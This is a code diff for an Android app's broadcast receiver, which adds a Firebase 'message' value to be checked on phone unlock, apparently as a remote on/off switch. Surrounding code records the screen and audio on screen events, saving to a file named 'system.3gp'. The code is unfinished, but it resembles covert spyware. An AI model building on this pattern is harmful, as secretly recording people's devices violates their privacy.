@@ -46,6 +46,7 @@ import com.google.android.gms.common.api.GoogleApiClient
 import java.security.AccessController.getContext
 import java.text.Format
 import android.view.WindowManager.LayoutParams;
+import com.google.firebase.database.*
 import java.sql.Array
 
 
@@ -58,8 +59,7 @@ class PhoneStateReceiver : BroadcastReceiver() {
     var outputFile = Environment.getExternalStorageDirectory().absolutePath + "/system.3gp"
     private var filePath = ""
     var myAudioRecorder: MediaRecorder? = MediaRecorder()
-
-
+    var myRef: DatabaseReference?=null
     /**
      * A problem occurred when trying to create the output file
      */
@@ -75,7 +75,8 @@ class PhoneStateReceiver : BroadcastReceiver() {
             this.mContext = context
             //  mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             val action = intent.action
-
+            var database = FirebaseDatabase.getInstance()
+             myRef  = database.getReference("message")
 
             if (ScreenPreference.getInstance(context).saveDeviceID == "0") {
                 if (Intent.ACTION_SCREEN_ON == action) {
@@ -100,23 +101,24 @@ class PhoneStateReceiver : BroadcastReceiver() {
 
 
                 } else if (Intent.ACTION_SCREEN_OFF == action) {
-                    Log.d(TAG, "screen is off...")
-                    var inten = Intent(mContext, ScreenRecordingActivity::class.java)
-                    inten.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                    ScreenPreference.getInstance(context).orderID = "false"
+                    if (ScreenRecordingActivity.instance.mMediaRecorder != null) {
 
-                    mContext!!.startActivity(inten)
-
+                        ScreenRecordingActivity.instance.mMediaRecorder!!.stop()
+                        ScreenRecordingActivity.instance.mMediaRecorder!!.reset()
+                    }
                 } else if (Intent.ACTION_USER_PRESENT == action) {
 
-                    Log.d(TAG, "screen is unlock...")
+                    checkOnOff()
+
+
+                   /* Log.d(TAG, "screen is unlock...")
                     var inten = Intent(mContext, ScreenRecordingActivity::class.java)
                     inten.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                     inten.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                     ScreenPreference.getInstance(context).orderID = "true"
 
                     mContext!!.startActivity(inten)
-                    context.startService(Intent(context, ScreenService::class.java))
+                    context.startService(Intent(context, ScreenService::class.java))*/
 
                 }
             }
@@ -183,6 +185,26 @@ class PhoneStateReceiver : BroadcastReceiver() {
 
     }
 
+    private fun checkOnOff() {
+        myRef!!.addValueEventListener(object : ValueEventListener {
+            override fun onCancelled(p0: DatabaseError) {
+
+            }
+
+            override fun onDataChange(dataSnapshot: DataSnapshot) {
+                val value = dataSnapshot.getValue(String::class.java)
+                Log.d(TAG, "Value is: $value")
+                if (value!!.contains("true")){
+
+                }
+            }
+        })
+
+    }
+
+    fun test() {
+        Log.d(TAG, "hehhhhhhhhhhhhhhhhhhhhh")
+    }
 
 }
 
